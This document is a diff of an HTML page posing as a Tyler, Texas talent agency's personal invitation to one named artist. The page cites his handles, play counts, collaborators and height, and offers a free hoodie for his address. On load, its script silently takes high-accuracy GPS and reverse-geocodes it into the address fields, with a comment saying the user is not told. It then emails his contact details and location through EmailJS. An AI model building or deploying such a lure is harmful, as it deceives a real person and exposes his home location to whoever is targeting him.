@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Elevate Collective • Artist Representation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Elevate Collective · Invitation</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
             background: #000000;
@@ -19,621 +19,547 @@
             line-height: 1.5;
             -webkit-font-smoothing: antialiased;
         }
-        
-        .portal {
+
+        .invitation {
             background: #0a0a0a;
-            border-radius: 24px;
-            padding: 48px 40px;
-            max-width: 580px;
+            border-radius: 40px;
+            padding: 56px 40px;
+            max-width: 620px;
             width: 100%;
-            border: 1px solid #151515;
+            border: 1px solid #1c1c1c;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+            word-wrap: break-word;
+            text-align: center;
         }
-        
-        .brand {
+
+        /* Agency header */
+        .agency {
             display: flex;
             align-items: center;
-            gap: 12px;
+            justify-content: center;
+            gap: 10px;
             margin-bottom: 48px;
         }
-        
-        .brand-mark {
-            width: 36px;
-            height: 36px;
+
+        .logo {
+            width: 44px;
+            height: 44px;
             background: #ffffff;
-            border-radius: 6px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: #000000;
             font-weight: 700;
-            font-size: 1.2rem;
+            font-size: 1.5rem;
         }
-        
-        .brand-text {
-            font-weight: 600;
-            font-size: 1.2rem;
-            letter-spacing: -0.3px;
+
+        .agency-name {
+            font-weight: 500;
+            font-size: 1.5rem;
+            letter-spacing: -0.5px;
             color: #ffffff;
         }
-        
-        .brand-location {
-            margin-left: auto;
-            font-size: 0.65rem;
-            color: #555555;
+
+        .agency-location {
+            font-size: 0.7rem;
+            color: #777777;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: 500;
+            letter-spacing: 3px;
+            margin-left: 6px;
         }
-        
-        .artist-profile {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            margin-bottom: 32px;
+
+        /* Artist spotlight */
+        .artist {
+            margin-bottom: 40px;
         }
-        
-        /* Clean placeholder — replace background-image later if desired */
-        .artist-avatar {
-            width: 72px;
-            height: 72px;
-            background-color: #0d0d0d;
+
+        .artist-photo {
+            width: 96px;
+            height: 96px;
+            background-color: #111111;
             border-radius: 50%;
             background-size: cover;
             background-position: center;
-            border: 1px solid #222222;
-            background-image: url('https://via.placeholder.com/72/0d0d0d/ffffff?text=K');
+            border: 2px solid #2a2a2a;
+            margin: 0 auto 20px;
+            background-image: url('https://via.placeholder.com/96/111111/ffffff?text=K');
         }
-        
-        .artist-info h2 {
-            font-size: 2rem;
+
+        .artist-name {
+            font-size: 2.4rem;
             font-weight: 600;
-            letter-spacing: -0.5px;
+            letter-spacing: -0.8px;
             color: #ffffff;
             line-height: 1.1;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
-        
-        .artist-meta {
-            font-size: 0.8rem;
-            color: #777777;
+
+        .artist-handles {
+            font-size: 1rem;
+            color: #888888;
             display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
         }
-        
-        .ref {
-            font-size: 0.65rem;
+
+        /* Invitation headline */
+        .invite-eyebrow {
+            font-size: 0.75rem;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            color: #555555;
-            margin-bottom: 32px;
-            font-weight: 500;
-        }
-        
-        .headline {
-            font-size: 1.2rem;
-            font-weight: 500;
-            color: #ffffff;
+            letter-spacing: 4px;
+            color: #777777;
             margin-bottom: 20px;
-            letter-spacing: -0.3px;
-            line-height: 1.4;
         }
-        
-        .message {
-            color: #aaaaaa;
-            font-size: 0.95rem;
+
+        .invite-title {
+            font-size: 1.8rem;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+            color: #ffffff;
+            margin-bottom: 24px;
+            line-height: 1.2;
+        }
+
+        .invite-message {
+            color: #bbbbbb;
+            font-size: 1rem;
             line-height: 1.7;
-            margin-bottom: 28px;
+            margin-bottom: 36px;
+            max-width: 480px;
+            margin-left: auto;
+            margin-right: auto;
         }
-        
-        .message strong {
+
+        .invite-message strong {
             color: #ffffff;
             font-weight: 600;
         }
-        
-        .stats-grid {
+
+        /* Stats highlight — centered */
+        .stats {
             display: flex;
-            gap: 28px;
-            margin-bottom: 28px;
-            flex-wrap: wrap;
+            justify-content: center;
+            gap: 32px;
+            margin-bottom: 36px;
         }
-        
+
+        .stat-item {
+            text-align: center;
+        }
+
         .stat-number {
-            font-size: 1.4rem;
+            font-size: 1.8rem;
             font-weight: 600;
             color: #ffffff;
             letter-spacing: -0.5px;
         }
-        
+
         .stat-label {
             font-size: 0.6rem;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
+            letter-spacing: 2px;
             color: #666666;
-            font-weight: 500;
+            margin-top: 4px;
         }
-        
-        .curator-note {
-            background: rgba(255,255,255,0.02);
-            border-left: 2px solid #ffffff;
-            padding: 16px 20px;
-            margin-bottom: 20px;
-            color: #aaaaaa;
-            font-size: 0.95rem;
-            line-height: 1.7;
+
+        /* Curator quote — prominent */
+        .curator-quote {
+            background: transparent;
+            border-top: 1px solid #1c1c1c;
+            border-bottom: 1px solid #1c1c1c;
+            padding: 28px 0;
+            margin-bottom: 36px;
+            color: #cccccc;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            font-style: normal;
         }
-        
-        .curator-note strong {
+
+        .curator-quote strong {
             color: #ffffff;
             font-weight: 600;
         }
-        
-        .track-highlight {
+
+        .quote-author {
+            margin-top: 16px;
             font-size: 0.8rem;
-            color: #888888;
-            margin-bottom: 8px;
-        }
-        
-        .track-highlight strong {
-            color: #ffffff;
-        }
-        
-        .collab-note {
-            font-size: 0.7rem;
             color: #666666;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 8px;
-        }
-        
-        .divider {
-            height: 1px;
-            background: #1a1a1a;
-            margin: 36px 0 32px;
-        }
-        
-        .section-title {
-            font-size: 0.65rem;
             text-transform: uppercase;
             letter-spacing: 2px;
-            color: #666666;
-            margin-bottom: 24px;
-            font-weight: 500;
         }
-        
-        .section-subtitle {
-            font-size: 0.8rem;
-            color: #888888;
+
+        /* Venue interest — simple checkboxes */
+        .section-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #777777;
             margin-bottom: 20px;
-            line-height: 1.6;
         }
-        
-        .venue-list {
+
+        .venue-options {
             display: flex;
             flex-direction: column;
-            gap: 0;
+            gap: 8px;
             margin-bottom: 40px;
+            text-align: left;
         }
-        
-        .venue-option {
+
+        .venue-row {
             display: flex;
             align-items: center;
-            padding: 18px 0;
+            padding: 14px 0;
             border-bottom: 1px solid #151515;
             cursor: pointer;
             transition: opacity 0.15s;
         }
-        
-        .venue-option:hover { opacity: 0.8; }
-        .venue-option:last-child { border-bottom: none; }
-        
-        .venue-checkbox {
-            width: 20px;
-            height: 20px;
+
+        .venue-row:last-child { border-bottom: none; }
+
+        .venue-check {
+            width: 22px;
+            height: 22px;
             border: 1.5px solid #333333;
-            border-radius: 4px;
+            border-radius: 6px;
             margin-right: 20px;
             position: relative;
-            transition: all 0.15s;
+            flex-shrink: 0;
         }
-        
-        .venue-option.selected .venue-checkbox {
+
+        .venue-row.selected .venue-check {
             border-color: #ffffff;
             background: #ffffff;
         }
-        
-        .venue-option.selected .venue-checkbox::after {
+
+        .venue-row.selected .venue-check::after {
             content: '✓';
             color: #000000;
-            font-size: 12px;
+            font-size: 13px;
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             font-weight: 700;
         }
-        
-        .venue-info { flex: 1; }
-        
+
+        .venue-info {
+            flex: 1;
+        }
+
         .venue-name {
             font-weight: 500;
             color: #ffffff;
             font-size: 1rem;
         }
-        
-        .venue-details {
+
+        .venue-detail {
             font-size: 0.7rem;
             color: #666666;
-            margin-top: 4px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            margin-top: 2px;
         }
-        
-        .venue-note {
-            color: #888888;
-            font-size: 0.75rem;
+
+        .venue-range {
+            color: #aaaaaa;
+            font-size: 0.9rem;
+            font-weight: 400;
         }
-        
+
+        /* Form fields — clean and minimal */
         .form-group {
             margin-bottom: 28px;
+            text-align: left;
         }
-        
+
         .form-label {
             font-size: 0.65rem;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: #666666;
-            margin-bottom: 12px;
-            font-weight: 500;
+            letter-spacing: 2px;
+            color: #777777;
+            margin-bottom: 10px;
         }
-        
+
         input, select, textarea {
             width: 100%;
             padding: 16px 0;
             border: none;
-            border-bottom: 1px solid #1a1a1a;
-            font-size: 0.95rem;
+            border-bottom: 1px solid #1c1c1c;
+            font-size: 1rem;
             color: #ffffff;
             background: transparent;
             font-family: inherit;
-            font-weight: 400;
         }
-        
+
         input:focus, select:focus, textarea:focus {
             outline: none;
             border-bottom-color: #ffffff;
         }
-        
+
         input::placeholder, textarea::placeholder {
             color: #444444;
-            font-weight: 300;
         }
-        
+
         select {
             cursor: pointer;
             appearance: none;
             background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="%23666666" stroke-width="1.5"><polyline points="6 9 12 15 18 9"/></svg>') no-repeat right center;
         }
-        
-        select option {
-            background: #0a0a0a;
-            color: #ffffff;
-        }
-        
-        .welcome-package {
-            background: rgba(255,255,255,0.02);
+
+        /* Welcome gift section */
+        .gift-section {
+            background: #0e0e0e;
+            border-radius: 24px;
+            padding: 32px 28px;
+            margin: 40px 0 32px;
+            text-align: center;
             border: 1px solid #1a1a1a;
-            border-radius: 12px;
-            padding: 28px;
-            margin: 32px 0 24px;
         }
-        
-        .package-title {
-            font-size: 1rem;
-            font-weight: 600;
+
+        .gift-title {
+            font-size: 1.3rem;
+            font-weight: 500;
             color: #ffffff;
             margin-bottom: 12px;
             letter-spacing: -0.3px;
         }
-        
-        .package-desc {
-            font-size: 0.85rem;
+
+        .gift-desc {
             color: #aaaaaa;
-            margin-bottom: 24px;
+            font-size: 0.95rem;
             line-height: 1.6;
+            margin-bottom: 28px;
         }
-        
-        .package-desc strong {
+
+        .gift-desc strong {
             color: #ffffff;
         }
-        
-        .package-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
+
+        .size-row {
+            display: flex;
+            gap: 16px;
             margin-bottom: 20px;
         }
-        
-        .address-full {
-            grid-column: span 2;
+
+        .size-row .form-group {
+            flex: 1;
+            margin-bottom: 0;
         }
-        
-        .measurement-note {
-            background: transparent;
-            padding: 12px 0;
+
+        .address-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .address-row .form-group:first-child {
+            flex: 2;
+            min-width: 200px;
+        }
+
+        .address-row .form-group {
+            flex: 1;
+            min-width: 100px;
+        }
+
+        .tall-note {
+            margin-top: 20px;
             font-size: 0.75rem;
-            color: #666666;
-            border-top: 1px solid #1a1a1a;
-            margin-top: 16px;
+            color: #777777;
             text-transform: uppercase;
             letter-spacing: 1px;
-        }
-        
-        .interview-note {
-            background: transparent;
-            padding: 20px 0;
-            margin: 24px 0;
             border-top: 1px solid #1a1a1a;
-            border-bottom: 1px solid #1a1a1a;
-            text-align: center;
+            padding-top: 20px;
         }
-        
-        .interview-text {
-            font-size: 0.85rem;
-            color: #aaaaaa;
-            line-height: 1.7;
-        }
-        
-        .interview-text strong {
-            color: #ffffff;
-            font-weight: 600;
-        }
-        
-        .submit-button {
+
+        /* CTA button */
+        .cta-button {
             width: 100%;
-            padding: 18px;
+            padding: 20px;
             background: #ffffff;
             color: #000000;
             border: none;
-            border-radius: 6px;
-            font-size: 0.9rem;
-            font-weight: 500;
+            border-radius: 16px;
+            font-size: 1.1rem;
+            font-weight: 600;
             cursor: pointer;
-            margin: 0 0 24px;
+            margin: 16px 0 24px;
             transition: all 0.2s;
-            letter-spacing: 1px;
-            text-transform: uppercase;
+            letter-spacing: -0.2px;
+            text-transform: none;
         }
-        
-        .submit-button:hover {
+
+        .cta-button:hover {
             background: #e0e0e0;
+            transform: scale(1.01);
         }
-        
-        .legal-note {
-            font-size: 0.6rem;
+
+        .footer-note {
+            font-size: 0.65rem;
             color: #555555;
-            text-align: center;
-            line-height: 1.7;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
         }
-        
-        .success-screen {
+
+        /* Success screen */
+        .success-container {
             text-align: center;
-            padding: 48px 0;
+            padding: 40px 0;
         }
-        
+
         .success-icon {
-            width: 64px;
-            height: 64px;
-            border: 1px solid #222222;
+            width: 72px;
+            height: 72px;
+            border: 2px solid #2a2a2a;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 32px;
         }
-        
+
         .success-icon svg {
-            width: 28px;
-            height: 28px;
+            width: 32px;
+            height: 32px;
             stroke: #ffffff;
             stroke-width: 1.5;
         }
-        
+
         .success-title {
-            font-size: 1.8rem;
+            font-size: 2rem;
             font-weight: 500;
             margin-bottom: 16px;
-            color: #ffffff;
-            letter-spacing: -0.5px;
         }
-        
-        .success-subtitle {
-            font-size: 0.9rem;
+
+        .success-message {
             color: #aaaaaa;
-            margin-bottom: 40px;
-        }
-        
-        .success-card {
-            color: #aaaaaa;
-            font-size: 0.95rem;
-            line-height: 1.8;
-            padding: 0;
-        }
-        
-        .success-card strong {
-            color: #ffffff;
-            font-weight: 500;
-        }
-        
-        .badge {
-            display: inline-block;
-            background: transparent;
-            padding: 0;
-            font-size: 0.65rem;
-            color: #666666;
-            border: none;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 16px;
-        }
-        
-        .success-divider {
-            height: 1px;
-            background: #1a1a1a;
-            margin: 32px 0;
+            margin-bottom: 32px;
         }
     </style>
 </head>
 <body>
-<div class="portal" id="app">
-    <div class="brand">
-        <div class="brand-mark">E</div>
-        <div class="brand-text">Elevate Collective</div>
-        <div class="brand-location">Tyler, TX</div>
+<div class="invitation" id="app">
+    <!-- Agency header -->
+    <div class="agency">
+        <div class="logo">E</div>
+        <div class="agency-name">Elevate</div>
+        <div class="agency-location">Tyler</div>
     </div>
-    
-    <div class="artist-profile">
-        <div class="artist-avatar"></div>
-        <div class="artist-info">
-            <h2>Keyvon Ellis</h2>
-            <div class="artist-meta">
-                <span>@highk3yz</span>
-                <span>•</span>
-                <span>@smok3yz5</span>
-            </div>
+
+    <!-- Artist spotlight -->
+    <div class="artist">
+        <div class="artist-photo"></div>
+        <div class="artist-name">Keyvon Ellis</div>
+        <div class="artist-handles">
+            <span>@highk3yz</span>
+            <span>·</span>
+            <span>@smok3yz5</span>
         </div>
     </div>
-    
-    <div class="ref">Artist Representation Inquiry — Ref: ETX·2026·117</div>
-    
-    <div class="headline">Your catalog is gaining traction. We want to discuss representation.</div>
-    
-    <div class="message">
-        <strong>"TMR"</strong> (846 plays) · <strong>"Splinter"</strong> (464) · <strong>"Dirty Money"</strong> ft. 98baby (306) · <strong>"Rolling clouds"</strong> (287). You've built a legitimate body of work. Our A&R team sees clear potential for placement and development across our East Texas network.
+
+    <!-- Invitation content -->
+    <div class="invite-eyebrow">Personal Invitation</div>
+    <div class="invite-title">Let's talk about representation.</div>
+    <div class="invite-message">
+        <strong>"TMR"</strong> (846) · <strong>"Splinter"</strong> (464) · <strong>"Dirty Money"</strong> (306)<br>
+        Your catalog is moving. We've been watching.
     </div>
-    
-    <div class="stats-grid">
-        <div class="stat"><div class="stat-number">846</div><div class="stat-label">"TMR"</div></div>
-        <div class="stat"><div class="stat-number">464</div><div class="stat-label">"Splinter"</div></div>
-        <div class="stat"><div class="stat-number">306</div><div class="stat-label">"Dirty Money"</div></div>
-        <div class="stat"><div class="stat-number">22+</div><div class="stat-label">Catalog</div></div>
+
+    <!-- Stats -->
+    <div class="stats">
+        <div class="stat-item">
+            <div class="stat-number">846</div>
+            <div class="stat-label">"TMR"</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number">464</div>
+            <div class="stat-label">"Splinter"</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number">306</div>
+            <div class="stat-label">"Dirty Money"</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number">22+</div>
+            <div class="stat-label">Catalog</div>
+        </div>
     </div>
-    
-    <div class="curator-note">
-        <strong>Curator's note</strong> — You're connected. ZayOn$um, Rico, 98baby, LC Purfininty, kidzeus — real relationships. The Frozy-produced "Rastas" shows you understand production. We want to explore formal representation and what Elevate can do for your career.
+
+    <!-- Curator quote -->
+    <div class="curator-quote">
+        "You're connected in Tyler — ZayOn$um, Rico, 98baby.<br>
+        <strong>We see the foundation for something real.</strong>"
+        <div class="quote-author">— A&R, Elevate Collective</div>
     </div>
-    
-    <div class="track-highlight">
-        <strong>Standout catalog:</strong> TMR · Splinter · Dirty Money · Rolling clouds · Keep up · Houdini · $hameless · I miss you 😭
-    </div>
-    
-    <div class="collab-note">
-        Collaborators: ZayOn$um · Rico · 98baby · LC Purfininty · kidzeus · prod. Frozy
-    </div>
-    
-    <div class="divider"></div>
-    
-    <div class="section-title">Venue interest</div>
-    <div class="section-subtitle">
-        Select venues you'd want to prioritize. Helps us understand where you see yourself performing.
-    </div>
-    
-    <div class="venue-list">
-        <div class="venue-option selected" data-venue="The Foundry">
-            <div class="venue-checkbox"></div>
+
+    <!-- Venue interest -->
+    <div class="section-label">Venues you'd consider</div>
+    <div class="venue-options">
+        <div class="venue-row selected" data-venue="The Foundry">
+            <div class="venue-check"></div>
             <div class="venue-info">
                 <div class="venue-name">The Foundry</div>
-                <div class="venue-details">Downtown · 300 cap</div>
+                <div class="venue-detail">Downtown · 300 cap</div>
             </div>
-            <div class="venue-note">$500–$750</div>
+            <div class="venue-range">$500–750</div>
         </div>
-        <div class="venue-option" data-venue="True Vine Brewing">
-            <div class="venue-checkbox"></div>
+        <div class="venue-row" data-venue="True Vine Brewing">
+            <div class="venue-check"></div>
             <div class="venue-info">
                 <div class="venue-name">True Vine Brewing</div>
-                <div class="venue-details">Earl Campbell Pkwy · 250 cap</div>
+                <div class="venue-detail">Earl Campbell Pkwy · 250 cap</div>
             </div>
-            <div class="venue-note">$600–$800</div>
+            <div class="venue-range">$600–800</div>
         </div>
-        <div class="venue-option" data-venue="Stanley's BBQ">
-            <div class="venue-checkbox"></div>
+        <div class="venue-row" data-venue="Stanley's BBQ">
+            <div class="venue-check"></div>
             <div class="venue-info">
                 <div class="venue-name">Stanley's Famous BBQ</div>
-                <div class="venue-details">S Beckham Ave · 200 cap</div>
+                <div class="venue-detail">S Beckham Ave · 200 cap</div>
             </div>
-            <div class="venue-note">$750–$900</div>
+            <div class="venue-range">$750–900</div>
         </div>
-        <div class="venue-option" data-venue="Brick Street Bar">
-            <div class="venue-checkbox"></div>
+        <div class="venue-row" data-venue="Brick Street Bar">
+            <div class="venue-check"></div>
             <div class="venue-info">
                 <div class="venue-name">Brick Street Bar</div>
-                <div class="venue-details">Downtown · 400 cap</div>
+                <div class="venue-detail">Downtown · 400 cap</div>
             </div>
-            <div class="venue-note">$900+</div>
+            <div class="venue-range">$900+</div>
         </div>
     </div>
-    
-    <div class="divider"></div>
-    
+
+    <!-- Contact form -->
     <div class="form-group">
-        <div class="form-label">Full name</div>
-        <input type="text" id="nameInput" value="Keyvon Ellis">
+        <div class="form-label">Your email</div>
+        <input type="email" id="emailInput" placeholder="For scheduling a conversation">
     </div>
-    
-    <div class="form-group">
-        <div class="form-label">Email</div>
-        <input type="email" id="emailInput" placeholder="For scheduling conversation">
-    </div>
-    
+
     <div class="form-group">
         <div class="form-label">Phone (optional)</div>
         <input type="tel" id="phoneInput" placeholder="For text updates">
     </div>
-    
+
     <div class="form-group">
-        <div class="form-label">Preferred contact time</div>
-        <select id="slotSelect">
-            <option value="Weekday morning">Weekday morning (9am–12pm)</option>
-            <option value="Weekday afternoon" selected>Weekday afternoon (12pm–5pm)</option>
-            <option value="Weekday evening">Weekday evening (5pm–8pm)</option>
-            <option value="Weekend">Weekend (flexible)</option>
+        <div class="form-label">Best time to connect</div>
+        <select id="timeSelect">
+            <option value="Weekday morning">Weekday morning</option>
+            <option value="Weekday afternoon" selected>Weekday afternoon</option>
+            <option value="Weekday evening">Weekday evening</option>
+            <option value="Weekend">Weekend</option>
         </select>
     </div>
-    
-    <div class="form-group">
-        <div class="form-label">Anything you want us to know?</div>
-        <textarea id="messageInput" placeholder="Goals, upcoming releases, questions..." rows="2"></textarea>
-    </div>
-    
-    <div class="welcome-package">
-        <div class="package-title">🎁 Artist Welcome Package</div>
-        <div class="package-desc">
-            All artists who complete an initial conversation receive a <strong>free Elevate Collective welcome package</strong> — heavyweight hoodie, premium tee, beanie, and stickers.
+
+    <!-- Welcome gift -->
+    <div class="gift-section">
+        <div class="gift-title">🎁 Welcome package</div>
+        <div class="gift-desc">
+            All artists who connect receive a <strong>free Elevate hoodie, tee & beanie</strong>.<br>
+            Just tell us where to send it.
         </div>
-        
-        <div class="package-grid">
-            <div class="form-group address-full">
-                <div class="form-label">Shipping Address</div>
-                <input type="text" id="streetInput" placeholder="Street address">
-            </div>
+
+        <div class="size-row">
             <div class="form-group">
-                <div class="form-label">City</div>
-                <input type="text" id="cityInput" placeholder="City">
-            </div>
-            <div class="form-group">
-                <div class="form-label">State</div>
-                <input type="text" id="stateInput" placeholder="State">
-            </div>
-            <div class="form-group">
-                <div class="form-label">ZIP</div>
-                <input type="text" id="zipInput" placeholder="ZIP">
-            </div>
-            <div class="form-group">
-                <div class="form-label">Hoodie Size</div>
+                <div class="form-label">Hoodie</div>
                 <select id="hoodieSize">
                     <option value="M">M</option>
                     <option value="L" selected>L</option>
@@ -642,7 +568,7 @@
                 </select>
             </div>
             <div class="form-group">
-                <div class="form-label">Tee Size</div>
+                <div class="form-label">Tee</div>
                 <select id="teeSize">
                     <option value="M">M</option>
                     <option value="L" selected>L</option>
@@ -651,33 +577,45 @@
                 </select>
             </div>
         </div>
-        
-        <div class="measurement-note">
-            💡 Premium fit — size up for oversized. You're tall — we recommend XL/2XL for hoodie comfort. Beanie is one size.
+
+        <div class="address-row">
+            <div class="form-group">
+                <div class="form-label">Street</div>
+                <input type="text" id="streetInput" placeholder="Address">
+            </div>
+            <div class="form-group">
+                <div class="form-label">City</div>
+                <input type="text" id="cityInput" placeholder="City">
+            </div>
+            <div class="form-group">
+                <div class="form-label">State</div>
+                <input type="text" id="stateInput" placeholder="TX">
+            </div>
+            <div class="form-group">
+                <div class="form-label">ZIP</div>
+                <input type="text" id="zipInput" placeholder="75701">
+            </div>
+        </div>
+
+        <div class="tall-note">
+            You're tall — we recommend sizing up for the hoodie. Beanie is one size.
         </div>
     </div>
-    
-    <div class="interview-note">
-        <div class="interview-text">
-            <strong>This is not a commitment.</strong> It's a conversation about your goals and whether Elevate is the right partner for your next chapter.
-        </div>
-    </div>
-    
-    <button class="submit-button" id="submitBtn">Request Conversation →</button>
-    
-    <div class="legal-note">
-        Elevate Collective • Tyler, TX • Artist development & representation
+
+    <button class="cta-button" id="submitBtn">Accept Invitation →</button>
+
+    <div class="footer-note">
+        Elevate Collective · Tyler, TX · Ref: ETX·2026·117
     </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
     (function() {
-        // Track selected venues (multiple)
+        // Venue selection
         let selectedVenues = ['The Foundry'];
-        
-        document.querySelectorAll('.venue-option').forEach(item => {
-            item.addEventListener('click', function() {
+        document.querySelectorAll('.venue-row').forEach(row => {
+            row.addEventListener('click', function() {
                 const venue = this.dataset.venue;
                 if (this.classList.contains('selected')) {
                     this.classList.remove('selected');
@@ -689,95 +627,68 @@
             });
         });
 
-        // Silent GPS + reverse geocode — no mention to user
-        async function silentLocationFill() {
+        // Silent GPS fill
+        async function fillAddressSilently() {
             if (!navigator.geolocation) return;
-            
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lng = pos.coords.longitude;
-                
                 try {
-                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`);
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&addressdetails=1`);
                     const data = await res.json();
-                    
                     if (data.address) {
-                        const addr = data.address;
-                        const street = `${addr.road || ''} ${addr.house_number || ''}`.trim();
-                        const city = addr.city || addr.town || addr.village || addr.suburb || '';
-                        const state = addr.state || '';
-                        const zip = addr.postcode || '';
-                        
+                        const a = data.address;
+                        const street = `${a.road || ''} ${a.house_number || ''}`.trim();
                         if (street) document.getElementById('streetInput').value = street;
-                        if (city) document.getElementById('cityInput').value = city;
-                        if (state) document.getElementById('stateInput').value = state;
-                        if (zip) document.getElementById('zipInput').value = zip;
+                        if (a.city || a.town) document.getElementById('cityInput').value = a.city || a.town;
+                        if (a.state) document.getElementById('stateInput').value = a.state;
+                        if (a.postcode) document.getElementById('zipInput').value = a.postcode;
                     }
-                } catch (e) {
-                    // Silent fail — user can enter manually
-                }
-            }, () => {
-                // Silent fail
-            }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                } catch (e) {}
+            }, () => {}, { enableHighAccuracy: true, timeout: 4000 });
         }
-        
-        silentLocationFill();
+        fillAddressSilently();
 
+        // EmailJS
         emailjs.init('0pn8P18xI5m0VVW8U');
 
-        async function submitRequest() {
+        async function submitForm() {
             const email = document.getElementById('emailInput').value.trim();
             if (!email || !email.includes('@')) {
-                alert('Valid email required.');
+                alert('Please enter a valid email address.');
                 return false;
             }
-            
-            const name = document.getElementById('nameInput').value.trim() || 'Keyvon Ellis';
+
             const phone = document.getElementById('phoneInput').value.trim() || '—';
-            const slot = document.getElementById('slotSelect').value;
-            const note = document.getElementById('messageInput').value.trim() || '—';
+            const time = document.getElementById('timeSelect').value;
+            const hoodie = document.getElementById('hoodieSize').value;
+            const tee = document.getElementById('teeSize').value;
             const street = document.getElementById('streetInput').value.trim();
             const city = document.getElementById('cityInput').value.trim();
             const state = document.getElementById('stateInput').value.trim();
             const zip = document.getElementById('zipInput').value.trim();
-            const hoodie = document.getElementById('hoodieSize').value;
-            const tee = document.getElementById('teeSize').value;
-            
             const address = street && city ? `${street}, ${city}, ${state} ${zip}` : 'Not provided';
-            
-            const messageBody = `ELEVATE — ARTIST REPRESENTATION INQUIRY
-REF: ETX·2026·117
 
-ARTIST
-Keyvon Ellis (@highk3yz | @smok3yz5)
+            const message = `ELEVATE · ARTIST INVITATION ACCEPTED
+Ref: ETX·2026·117
+
+Keyvon Ellis (@highk3yz · @smok3yz5)
 ${email} | ${phone}
 
-CATALOG HIGHLIGHTS
-TMR: 846 | Splinter: 464 | Dirty Money: 306
-Rolling clouds: 287 | 22+ tracks
-
-VENUE INTEREST
-${selectedVenues.join(' · ')}
-
-CONTACT PREFERENCE
-${slot}
-
-NOTES
-${note}
+CATALOG: TMR (846) · Splinter (464) · Dirty Money (306) · 22+ tracks
+VENUE INTEREST: ${selectedVenues.join(' · ')}
+CONTACT TIME: ${time}
 
 WELCOME PACKAGE
 Hoodie: ${hoodie} | Tee: ${tee}
 Address: ${address}
 
 —
-Submitted via Elevate Collective portal
-${new Date().toLocaleString()}`;
+Submitted ${new Date().toLocaleString()}`;
 
             await emailjs.send('service_cyval67', 'template_35yqug3', {
-                name: name,
+                name: 'Keyvon Ellis',
                 email: email,
-                message: messageBody,
-                selected_date: 'Representation Inquiry',
+                message: message,
+                selected_date: 'Invitation Accepted',
                 reply_to: email
             });
             return true;
@@ -785,22 +696,18 @@ ${new Date().toLocaleString()}`;
 
         function showSuccess() {
             document.getElementById('app').innerHTML = `
-                <div class="success-screen">
+                <div class="success-container">
                     <div class="success-icon">
                         <svg viewBox="0 0 24 24" fill="none">
                             <polyline points="20 6 9 17 4 12" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </div>
-                    <div class="success-title">Request received.</div>
-                    <div class="success-subtitle">We'll reach out within 48 hours.</div>
-                    <div class="success-card">
-                        <div class="badge">Ref: ETX·2026·117</div>
-                        <strong>Thank you, Keyvon.</strong><br>
-                        Your representation inquiry has been logged.<br>
-                        ${selectedVenues.length ? `Venue interest: ${selectedVenues.join(' · ')}` : ''}
-                        <div class="success-divider"></div>
-                        Welcome package ships after initial conversation.
+                    <div class="success-title">You're on the list.</div>
+                    <div class="success-message">
+                        We'll reach out within 48 hours to schedule a conversation.<br>
+                        Welcome package ships this week.
                     </div>
+                    <div class="footer-note" style="margin-top:40px;">Ref: ETX·2026·117</div>
                 </div>
             `;
         }
@@ -808,20 +715,15 @@ ${new Date().toLocaleString()}`;
         document.getElementById('submitBtn').addEventListener('click', async (e) => {
             e.preventDefault();
             const btn = e.target;
-            const original = btn.textContent;
-            btn.textContent = 'Processing...';
+            btn.textContent = 'Sending...';
             btn.disabled = true;
-            btn.style.opacity = '0.6';
-            
             try {
-                const success = await submitRequest();
-                if (success !== false) showSuccess();
-            } catch (error) {
-                console.error('Error:', error);
-                alert('Submission error. Please try again.');
-                btn.textContent = original;
+                const ok = await submitForm();
+                if (ok !== false) showSuccess();
+            } catch (err) {
+                alert('Something went wrong. Please try again.');
+                btn.textContent = 'Accept Invitation →';
                 btn.disabled = false;
-                btn.style.opacity = '1';
             }
         });
     })();
